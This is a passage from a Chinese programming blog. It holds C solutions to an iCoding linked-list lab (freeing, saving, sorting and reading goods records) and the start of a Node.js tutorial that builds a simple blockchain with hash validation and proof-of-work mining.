class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;lab52.h&quot;</span> <span class="hljs-comment">// 请不要删除本行头文件，否则检查不通过</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> CurrentCnt; <span class="hljs-comment">// 请不要删除本行的全局变量声明，否则检查不通过</span><br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">output_all_items</span><span class="hljs-params">(GoodsList *L)</span><br>&#123;<br>    GoodsList *Cur = L-&gt;next;<br>    <span class="hljs-keyword">while</span> (Cur)<br>    &#123;<br>        output_one_item(Cur);<br>        Cur = Cur-&gt;next;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="链表：09-释放链表"><a href="#链表：09-释放链表" class="headerlink" title="链表：09-释放链表"></a>链表：09-释放链表</h3><blockquote><p>函数原型：void destory_list(GoodsList **L)，</p><p>该函数释放包括头结点在内的所有结点，完成后指向链表头结点的指针为NULL。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;lab52.h&quot;</span> <span class="hljs-comment">// 请不要删除本行头文件，否则检查不通过</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> CurrentCnt; <span class="hljs-comment">// 请不要删除本行的全局变量声明，否则检查不通过</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">destory_list</span><span class="hljs-params">(GoodsList **pL)</span><br>&#123;<br>    GoodsList *Cur = *pL, *Des;<br>    <span class="hljs-keyword">while</span> (Cur-&gt;next)<br>    &#123;<br>        Des = Cur-&gt;next;<br>        Cur-&gt;next = Des-&gt;next;<br>        <span class="hljs-built_in">free</span>(Des);<br>    &#125;<br>    <span class="hljs-built_in">free</span>(*pL);<br>    (*pL) = <span class="hljs-literal">NULL</span>;<br>    CurrentCnt = <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="链表：10-释放链表并删除文件"><a href="#链表：10-释放链表并删除文件" class="headerlink" title="链表：10-释放链表并删除文件"></a>链表：10-释放链表并删除文件</h3><blockquote><p>函数原型：void destory_list_and_file(GoodsList **L)，</p><p>该函数调用destory_list释放包括头结点在内的所有结点，将指向链表头结点的指针为NULL，最后删除存储商品信息的文件goodinfo.txt。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;lab52.h&quot;</span> <span class="hljs-comment">// 请不要删除本行头文件，否则检查不通过</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> CurrentCnt; <span class="hljs-comment">// 请不要删除本行的全局变量声明，否则检查不通过</span><br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">destory_list_and_file</span><span class="hljs-params">(GoodsList **pL)</span><br>&#123;<br>    destory_list(pL);<br>    remove(<span class="hljs-string">&quot;goodsinfo.txt&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="链表：11-保存文件"><a href="#链表：11-保存文件" class="headerlink" title="链表：11-保存文件"></a>链表：11-保存文件</h3><blockquote><p>函数原型：int save_to_file(GoodsList *L)</p><p>将当前链表所有的商品信息保存到文件 goodsinfo.txt 中，其中L为指向链表头结点的指针，保存成功后，该函数返回商品的数量。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;lab52.h&quot;</span> <span class="hljs-comment">// 请不要删除本行头文件，否则检查不通过</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> CurrentCnt; <span class="hljs-comment">// 请不要删除本行的全局变量声明，否则检查不通过</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">save_to_file</span><span class="hljs-params">(GoodsList *L)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (!L)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    GoodsList *Cur = L-&gt;next;<br>    FILE *f = fopen(<span class="hljs-string">&quot;goodsinfo.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>); <span class="hljs-comment">// iCoding貌似识别不了GOODS_FILE_NAME</span><br>    <span class="hljs-type">int</span> counts = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (!f)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (Cur)<br>    &#123;<br><br>        <span class="hljs-built_in">fprintf</span>(f, <span class="hljs-string">&quot;%s\t%s\t%d\t%s\t%d\t%d\n&quot;</span>,<br>                Cur-&gt;data.goods_id,<br>                Cur-&gt;data.goods_name,<br>                Cur-&gt;data.goods_price,<br>                Cur-&gt;data.goods_discount,<br>                Cur-&gt;data.goods_amount,<br>                Cur-&gt;data.goods_remain);<br><br>        Cur = Cur-&gt;next;<br>        counts++;<br>    &#125;<br><br>    fclose(f);<br>    f = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">return</span> counts;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="链表：12-排序"><a href="#链表：12-排序" class="headerlink" title="链表：12-排序"></a>链表：12-排序</h3><blockquote><p>函数原型：void bubble_sort(GoodsList *L)</p><p>L为指向链表头结点的指针，该函数利用冒泡排序算法，按价格从低到高对商品进行排序。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;lab52.h&quot;</span> <span class="hljs-comment">// 请不要删除本行头文件，否则检查不通过</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> CurrentCnt; <span class="hljs-comment">// 请不要删除本行的全局变量声明，否则检查不通过</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">bubble_sort</span><span class="hljs-params">(GoodsList *L)</span><br>&#123;<br>    GoodsList *Cur = L-&gt;next;<br>    GoodsInfo temp;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; CurrentCnt - <span class="hljs-number">1</span>; i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt; CurrentCnt - i; j++)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (Cur-&gt;data.goods_price &gt; Cur-&gt;next-&gt;data.goods_price)<br>            &#123;<br>                temp = Cur-&gt;data;<br>                Cur-&gt;data = Cur-&gt;next-&gt;data;<br>                Cur-&gt;next-&gt;data = temp;<br>                <span class="hljs-comment">// output_all_items(L);</span><br>                <span class="hljs-comment">//  printf(&quot;\n&quot;);</span><br>            &#125;<br>            Cur = Cur-&gt;next;<br>        &#125;<br>        Cur = L-&gt;next;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="链表：13-读商品信息"><a href="#链表：13-读商品信息" class="headerlink" title="链表：13-读商品信息"></a>链表：13-读商品信息</h3><blockquote><p>函数原型：GoodsInfo read_goods_info()</p><p>该函数调用read_line及scanf等函数，按“商品ID、商品名称、商品价格、商品折扣、商品数量、商品剩余数量”的顺序让用户输入，并将这些信息保存到 GoodsInfo 结构体中，函数最后返回该结构体。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;lab52.h&quot;</span> <span class="hljs-comment">// 请不要删除本行头文件，否则检查不通过</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> CurrentCnt; <span class="hljs-comment">// 请不要删除本行的全局变量声明，否则检查不通过</span><br><br>GoodsInfo <span class="hljs-title function_">read_goods_info</span><span class="hljs-params">()</span><br>&#123;<br>    GoodsInfo goods;<br>    read_line(goods.goods_id, MAX_ID_LEN);<br>    read_line(goods.goods_name, MAX_NAME_LEN);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;goods.goods_price);<br>    read_line(goods.goods_discount, MAX_DISCOUNT_LEN);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;goods.goods_amount);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;goods.goods_remain);<br>    <span class="hljs-keyword">return</span> goods;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>iCoding</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Block Chain -- Proof Of Work</title>
    <link href="/posts/32752/"/>
    <url>/posts/32752/</url>
    
    <content type="html"><![CDATA[<h1 id="区块链共识机制-POW-工作量证明-Proof-Of-Work-学习"><a href="#区块链共识机制-POW-工作量证明-Proof-Of-Work-学习" class="headerlink" title="区块链共识机制 - POW 工作量证明 Proof Of Work 学习"></a>区块链共识机制 - POW 工作量证明 Proof Of Work 学习</h1><blockquote><p><strong>工作量证明PoW（Proof of Work）</strong>，通过算力的比拼来选取一个节点，由该节点决定下一轮共识的区块内容（记账权）。PoW要求节点消耗自身算力尝试不同的随机数（nonce），从而寻找符合算力难度要求的哈希值，不断重复尝试不同随机数直到找到符合要求为止，此过程称为“挖矿”。具体的流程如下图：</p><p><img src="https://pic4.zhimg.com/80/v2-ace420259e494348c6d6407f3e1a90c7_720w.webp" alt="img"></p><p>第一个找到合适的nonce的节点获得记账权。节点生成新区块后广播给其他节点，其他节点对此区块进行验证，若通过验证则接受该区块，完成本轮共识，否则拒绝该区块，继续寻找合适的nonce。</p><p>来自–<a href="https://zhuanlan.zhihu.com/p/367862889">一文读懂主流共识机制：PoW、PoS和DPoS - 知乎 (zhihu.com)</a></p></blockquote><p>这里通过<code>NodeJs</code>来实现–<a href="https://www.bilibili.com/video/BV14E411v7eS/?spm_id_from=333.788&vd_source=2c3bfa76e1e85787859b972cb7834a7c">程序员来讲讲什么是区块链 | 小白也能听懂的通俗解释 | 区块链原理 | 比特币 | 数字货币_哔哩哔哩_bilibili</a></p><h2 id="1、简易区块链搭建"><a href="#1、简易区块链搭建" class="headerlink" title="1、简易区块链搭建"></a>1、简易区块链搭建</h2><p>区块链，顾名思义是由一个个区块相连接而成组成的<strong>链式结构</strong></p><p>所以我们先定义Chain和Block类</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> sha256 = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;crypto-js/sha256&#x27;</span>)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Block</span>&#123;<br>    <br>    <span class="hljs-title function_">constructor</span>(<span class="hljs-params">data, preHash</span>)&#123;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">data</span> = data <span class="hljs-comment">// 区块储存的数据</span><br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">preHash</span> = preHash <span class="hljs-comment">// 储存上一个区块数据的哈希值</span><br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">hash</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">computeHash</span>() <span class="hljs-comment">// 当前区块数据的哈希值</span><br>    &#125;<br>    <br>    <span class="hljs-comment">// 生成该区块的Hash</span><br>    <span class="hljs-title function_">computeHash</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_">sha256</span>(<br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">data</span> +<br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">preHash</span><br>        ).<span class="hljs-title function_">toString</span>()<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Chain</span>&#123;<br>    <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">chain</span> = [<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">makeGenesis</span>()] <span class="hljs-comment">// 一个链中应由多个区块组成所以赋值成数组</span><br>    &#125;<br>    <br>    <span class="hljs-comment">// 生成起始区间</span><br>    <span class="hljs-title function_">makeGenesis</span>(<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Block</span>(<span class="hljs-string">&#x27;Origin&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>) <span class="hljs-comment">// 起始区块，索引为0，所以preHash为0</span><br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> fanChain = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Chain</span>()<br><span class="hljs-keyword">const</span> block1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Block</span>(<span class="hljs-string">&#x27;b1&#x27;</span>, <span class="hljs-string">&#x27;111&#x27;</span>)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(fanChain)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(block1)<br></code></pre></td></tr></table></figure><p>运行得：</p><p><img src="/posts/32752/image-20231124142339969.png" alt="image-20231124142339969"></p><p>此时链上只有<strong>起始区块</strong></p><p>那要把我们定义的<code>block1</code>加到<code>fanChain</code>上，就要在<code>chain</code>上构造相应方法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">/////////// class Chain ///////////</span><br><br><span class="hljs-comment">// 获得最新的区块</span><br>  <span class="hljs-title function_">getLatestBlock</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">chain</span>[<span class="hljs-variable language_">this</span>.<span class="hljs-property">chain</span>.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>]<br>  &#125;<br><br><span class="hljs-comment">// 手动增加区块</span><br>  <span class="hljs-title function_">addBlock</span>(<span class="hljs-params">newBlock</span>) &#123;<br>    newBlock.<span class="hljs-property">preHash</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getLatestBlock</span>().<span class="hljs-property">hash</span><br>    <span class="hljs-comment">// 因为在外部无法得知此时的preHash是什么，所以手动赋值</span><br>    newBlock.<span class="hljs-property">hash</span> = newBlock.<span class="hljs-title function_">computeHash</span>()<br>    <span class="hljs-comment">// computeHash()在Block类是构造时候调用的，但是newBlock传入的时候没有preHash，所以构造的Hash是错的，需要重新生成</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">chain</span>.<span class="hljs-title function_">push</span>(newBlock) <span class="hljs-comment">// 别忘了往链上添加</span><br>  &#125;<br><br><span class="hljs-keyword">const</span> fanChain = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Chain</span>()<br><span class="hljs-keyword">const</span> block1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Block</span>(<span class="hljs-string">&#x27;b1&#x27;</span>, <span class="hljs-string">&#x27;111&#x27;</span>)<br><span class="hljs-keyword">const</span> block2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Block</span>(<span class="hljs-string">&#x27;b2&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<br>fanChain.<span class="hljs-title function_">addBlock</span>(block1)<br>fanChain.<span class="hljs-title function_">addBlock</span>(block2)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(fanChain)<br><br></code></pre></td></tr></table></figure><p><img src="/posts/32752/image-20231124145754763.png" alt="image-20231124145754763"></p><p>可以看到：</p><ul><li><code>b1</code>的<code>preHash</code>与上一个区块<code>Origin</code>的<code>hash</code>一致</li><li><code>b2</code>的<code>preHash</code>与上一个区块<code>b1</code>的<code>hash</code>一致</li><li>成功链接</li></ul><p>这时候需要考虑一个问题，因为区块链具有不可篡改性</p><p>但是如果我们直接通过<code>fanChain.chain[1].data = &#39;fake&#39;</code>进行更改data数据</p><p><img src="/posts/32752/image-20231124150247884.png" alt="image-20231124150247884"></p><p>会发现<code>b1</code>的数据被篡改了，但是<code>hash</code>依旧不变，所以我们要对链中的区块增加校验过程</p><p>校验要进行的过程有：</p><ul><li>对比<code>Block</code>上储存的<code>hash</code>（也就是刚创建区块时候的<code>hash</code>）与通过当前<code>Block</code>数据再次生成的<code>hash</code>，以判断区块的<code>data</code>有没有被篡改</li><li>上一个区块的<code>hash</code>与当前区块的<code>preHash</code>是否一致，也就是是否构成链式结构</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">/////////// class Chain ///////////</span><br><br><span class="hljs-comment">// 对区块进行校验</span><br>  <span class="hljs-title function_">validateChain</span>(<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-comment">// 因为起始区块没有preHash所以单独校验</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">chain</span>.<span class="hljs-property">length</span> === <span class="hljs-number">1</span>) &#123;<br>      <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">chain</span>[<span class="hljs-number">0</span>].<span class="hljs-property">hash</span> !== <span class="hljs-variable language_">this</span>.<span class="hljs-property">chain</span>[<span class="hljs-number">0</span>].<span class="hljs-title function_">computeHash</span>()) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>      <span class="hljs-comment">// 对初始进行校验，原始的Hash与再次生成的Hash进行对比</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-variable language_">this</span>.<span class="hljs-property">chain</span>.<span class="hljs-property">length</span>; i++) &#123;<br><br>      <span class="hljs-comment">// 判断当前Block的data是否被篡改</span><br>      <span class="hljs-keyword">const</span> blockToValidate = <span class="hljs-variable language_">this</span>.<span class="hljs-property">chain</span>[i]<br>      <span class="hljs-keyword">if</span> (blockToValidate.<span class="hljs-property">hash</span> !== blockToValidate.<span class="hljs-title function_">computeHash</span>()) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br><br>      <span class="hljs-comment">// 比对前一个Block与当前Block的hash值是否相同</span><br>      <span class="hljs-keyword">const</span> preBlock = <span class="hljs-variable language_">this</span>.<span class="hljs-property">chain</span>[i - <span class="hljs-number">1</span>]<br>      <span class="hljs-keyword">if</span> (preBlock.<span class="hljs-property">hash</span> !== blockToValidate.<span class="hljs-property">preHash</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>  &#125;<br><br><span class="hljs-keyword">const</span> fanChain = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Chain</span>()<br><span class="hljs-keyword">const</span> block1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Block</span>(<span class="hljs-string">&#x27;b1&#x27;</span>, <span class="hljs-string">&#x27;111&#x27;</span>)<br><span class="hljs-keyword">const</span> block2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Block</span>(<span class="hljs-string">&#x27;b2&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<br>fanChain.<span class="hljs-title function_">addBlock</span>(block1)<br>fanChain.<span class="hljs-title function_">addBlock</span>(block2)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(fanChain.<span class="hljs-title function_">validateChain</span>())<br><br><span class="hljs-comment">// 尝试篡改区块</span><br>fanChain.<span class="hljs-property">chain</span>[<span class="hljs-number">1</span>].<span class="hljs-property">data</span> = <span class="hljs-string">&#x27;fake&#x27;</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(fanChain.<span class="hljs-title function_">validateChain</span>())<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(fanChain)<br><br></code></pre></td></tr></table></figure><p><img src="/posts/32752/image-20231124150847683.png" alt="image-20231124150847683"></p><p>可以发现<code>fanChain</code>在被人工篡改之后，被校验出来了</p><p>其次，我们也可以同时篡改区块的<code>hash</code></p><p><code>fanChain.chain[1].hash = fanChain.chain[1].computeHash()</code></p><p><img src="/posts/32752/image-20231124151938859.png" alt="image-20231124151938859"></p><p>但是发现依然校验失败，这是因为<code>b1</code>的<code>hash</code>改变了，所以导致<code>b2</code>的<code>preHash</code>与<code>b1</code>的<code>hash</code>不一致了，上下无法链接</p><h2 id="2、实现工作量证明机制"><a href="#2、实现工作量证明机制" class="headerlink" title="2、实现工作量证明机制"></a>2、实现工作量证明机制</h2><p>上述实现了一个简单的区块链结构，我们只要通过<code>computeHash</code>算出哈希值就可以把区块加到链上</p><p>但是比特币中，需要生成的<code>hash</code>满足特定条件，比如哈希前缀三位全为0，等…</p><p>所以如果需要满足的条件越多，需要的算力就越大</p><ul><li>这里我们定义<code>nonce</code>作为改变量</li><li>用<code>mine()</code>进行穷举比对</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">/////////// class Block ///////////</span><br><br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">data, preHash</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">data</span> = data <span class="hljs-comment">// 区块储存的数据</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">preHash</span> = preHash <span class="hljs-comment">// 储存上一个区块数据的哈希值</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">nonce</span> = <span class="hljs-number">0</span> <span class="hljs-comment">// 挖（比对）的次数</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">hash</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">computeHash</span>() <span class="hljs-comment">// 当前区块数据的哈希值</span><br>  &#125;<br><br><span class="hljs-comment">// 生成该区块的Hash</span><br>  <span class="hljs-title function_">computeHash</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">sha256</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">data</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">nonce</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">preHash</span>).<span class="hljs-title function_">toString</span>() <span class="hljs-comment">// 增加nonce作为改变量</span><br>  &#125;<br><br><span class="hljs-comment">// 生成挖矿所比对的前缀 difficulty越大需要时间越长</span><br>  <span 